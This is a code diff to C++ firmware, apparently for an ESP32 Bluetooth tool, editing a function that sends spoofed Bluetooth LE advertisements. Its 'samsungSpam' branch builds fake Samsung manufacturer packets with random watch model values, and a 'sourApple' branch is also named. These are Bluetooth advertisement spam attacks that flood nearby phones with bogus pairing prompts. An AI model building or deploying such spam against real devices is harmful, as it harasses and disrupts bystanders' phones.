@@ -1795,7 +1795,7 @@ void aj_adv(){
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
-    //pAdvertising->stop(); // This is placed here mostly for timing.
+    pAdvertising->stop(); // This is placed here mostly for timing.
                           // It allows the BLE beacon to run through the loop.
     BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
     if (sourApple){
@@ -1878,17 +1878,14 @@ void aj_adv(){
       Serial.println("");
     } else if (samsungSpam) {
       //Code from https://github.com/Spooks4576/Ghost_ESP/blob/main/src/components/ble_module/ble_module.h
-
       Serial.print(TXT_AD_SPAM_ADV);
       Serial.println("");
       uint8_t packet[15];
       uint8_t i = 0;
-      int randval = random(1, 2);
-
-      if (randval == 1)
+      int randval = random(1);
+      if (randval == 0)
       {
         uint8_t model = watch_models[rand() % 25].value;
-
         packet[i++] = 14; // Size
         packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
         packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
@@ -1904,7 +1901,6 @@ void aj_adv(){
         packet[i++] = 0x00;
         packet[i++] = 0x43;
         packet[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
-
         oAdvertisementData.addData(std::string((char *)packet, 15));
       }
       else 
